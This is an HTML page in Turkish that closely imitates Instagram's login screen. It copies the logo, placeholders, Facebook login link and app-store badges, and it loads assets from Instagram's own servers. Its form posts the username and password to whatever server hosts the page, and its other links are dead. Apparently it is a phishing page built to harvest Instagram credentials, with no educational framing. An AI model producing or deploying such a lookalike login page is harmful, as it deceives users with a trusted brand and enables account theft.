<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Giriş Yap</title>
</head>
<body style="background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column;">
    
    <div style="background-color: #ffffff; border: 1px solid #dbdbdb; width: 350px; padding: 10px 40px; text-align: center; margin-bottom: 10px;">
        <div style="margin-top: 36px; margin-bottom: 12px;">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b56d.png" alt="Instagram" style="width: 175px;">
        </div>

        <form method="POST" style="display: flex; flex-direction: column; margin-top: 24px;">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required style="height: 36px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; padding: 9px 8px; font-size: 12px; outline: none;">
            
            <input type="password" name="password" placeholder="Şifre" required style="height: 36px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 12px; padding: 9px 8px; font-size: 12px; outline: none;">
            
            <button type="submit" style="background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 7px 9px; font-weight: 600; font-size: 14px; cursor: pointer;">Giriş Yap</button>
        </form>
        <div style="display: flex; align-items: center; margin: 18px 0;">
            <div style="flex: 1; height: 1px; background-color: #dbdbdb;"></div>
            <div style="margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600;">YA DA</div>
            <div style="flex: 1; height: 1px; background-color: #dbdbdb;"></div>
        </div>

        <div style="margin-top: 8px;">
            <a href="#" style="color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: flex; align-items: center; justify-content: center;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" alt="FB" style="width: 16px; margin-right: 8px;">
                Facebook ile Giriş Yap
            </a>
        </div>

        <div style="margin-top: 20px; margin-bottom: 10px;">
            <a href="#" style="color: #00376b; font-size: 12px; text-decoration: none;">Şifreni mi unuttun?</a>
        </div>
    </div>

    <div style="background-color: #ffffff; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; margin-bottom: 10px;">
        <p style="font-size: 14px; margin: 0;">Hesabın yok mu? <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none;">Kaydol</a></p>
    </div>

    <div style="width: 350px; text-align: center; margin-top: 10px;">
        <p style="font-size: 14px; margin-bottom: 15px;">Uygulamayı indir.</p>
        <div style="display: flex; justify-content: center; gap: 8px;">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Y2619m9uF_1.png" alt="App Store" style="height: 40px;">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym_f0n.png" alt="Google Play" style="height: 40px;">
        </div>
    </div>
</body>
</html>
